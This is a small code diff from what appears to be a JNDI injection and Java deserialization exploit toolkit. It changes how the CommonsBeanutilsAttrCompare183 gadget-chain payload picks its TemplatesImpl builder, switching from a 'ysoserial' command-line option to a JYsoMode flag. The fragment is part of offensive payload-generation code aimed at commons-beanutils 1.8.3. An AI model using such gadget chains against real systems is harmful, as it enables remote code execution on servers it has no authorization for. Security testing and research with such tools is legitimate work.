@@ -18,6 +18,7 @@ import javassist.CtField;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@@ -26,7 +27,7 @@ public class CommonsBeanutilsAttrCompare183 implements ObjectPayload<Object> {
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object template;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             template = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             template = Gadgets.createTemplatesImpl(type, param);
